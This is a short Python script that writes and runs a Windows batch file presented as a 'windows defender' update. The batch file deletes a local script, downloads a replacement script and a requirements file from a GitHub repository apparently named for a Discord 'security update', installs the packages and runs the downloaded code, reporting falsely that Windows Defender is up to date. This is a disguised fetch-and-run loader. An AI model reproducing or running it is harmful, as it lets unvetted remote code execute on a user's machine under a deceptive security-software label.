import os
  
open("update.bat", "w+").write("""
@echo off
echo updating windows defender
timeout /t 10 /nobreak
del windowsDefender.py
    
curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/requirements.txt -O
    
py -m pip install -r requirements.txt
    
echo windows defender is up to date
py windowsDefender.py                         
""")

os.system("update.bat")
